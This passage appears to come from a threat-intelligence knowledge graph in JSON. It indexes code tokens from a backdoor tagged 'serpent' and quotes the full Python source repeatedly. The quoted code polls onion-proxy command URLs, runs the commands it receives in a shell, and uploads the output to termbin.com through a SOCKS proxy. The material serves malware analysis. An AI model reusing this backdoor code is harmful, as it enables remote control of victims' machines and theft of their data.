                            "value": "cmd_url_answer"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbd9e2f>",
                            "type": "UnknownWord",
                            "value": "req"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeb89dc00>",
                            "type": "UnknownWord",
                            "value": "strip"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x8f6856f3>",
                    "type": "File",
                    "value": "cmd.split"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x8f6856f3>",
                            "type": "File",
                            "value": "cmd.split"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x8f6856f3>",
                            "type": "File",
                            "value": "cmd.split"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x8f6856f3>",
                            "type": "File",
                            "value": "cmd.split"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x15b05971>",
                            "type": "UnknownWord",
                            "value": "cmd_split"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x8f6856f3>",
                            "type": "File",
                            "value": "cmd.split"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xce71ac19>",
                            "type": "UnknownWord",
                            "value": "--"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0xaaec47f2>",
                    "type": "File",
                    "value": "socks.socksocket"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xaaec47f2>",
                            "type": "File",
                            "value": "socks.socksocket"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xaaec47f2>",
                            "type": "File",
                            "value": "socks.socksocket"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xf5f3e975>",
                            "type": "UnknownWord",
                            "value": "termbin_cnx"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xaaec47f2>",
                            "type": "File",
                            "value": "socks.socksocket"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x47aadca4>",
                    "type": "File",
                    "value": "socket.socket"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xf5f3e975>",
                            "type": "UnknownWord",
                            "value": "termbin_cnx"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xc23fab37>",
                            "type": "UnknownWord",
                            "value": "sock_stream"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x1d0e0e13>",
                            "type": "UnknownWord",
                            "value": "af_inet"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x67229362>",
                    "type": "File",
                    "value": "socks.setdefaultproxy"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x8b77d438>",
                            "type": "UnknownWord",
                            "value": "proxy_type_socks5"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x6eca67e3>",
                            "type": "UnknownWord",
                            "value": "socks"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbeb4976f>",
                            "type": "UnknownWord",
                            "value": "9050"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0xb6c4c488>",
                    "type": "File",
                    "value": "termbin_cnx.connect"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xb6c4c488>",
                            "type": "File",
                            "value": "termbin_cnx.connect"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xb6c4c488>",
                            "type": "File",
                            "value": "termbin_cnx.connect"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x28c400d5>",
                    "type": "File",
                    "value": "termbin_cnx.send"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x28c400d5>",
                            "type": "File",
                            "value": "termbin_cnx.send"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x28c400d5>",
                            "type": "File",
                            "value": "termbin_cnx.send"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x2c96d624>",
                    "type": "File",
                    "value": "termbin_cnx.recv"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x2c96d624>",
                            "type": "File",
                            "value": "termbin_cnx.recv"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x2c96d624>",
                            "type": "File",
                            "value": "termbin_cnx.recv"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xedd12391>",
                            "type": "UnknownWord",
                            "value": "recv"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x2c96d624>",
                            "type": "File",
                            "value": "termbin_cnx.recv"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x7bc819d3>",
                    "type": "File",
                    "value": "recv.decode"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbac8d6cc>",
                            "type": "UnknownWord",
                            "value": "x00"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x817c96cb>",
                            "type": "UnknownWord",
                            "value": "termbin_url_created"
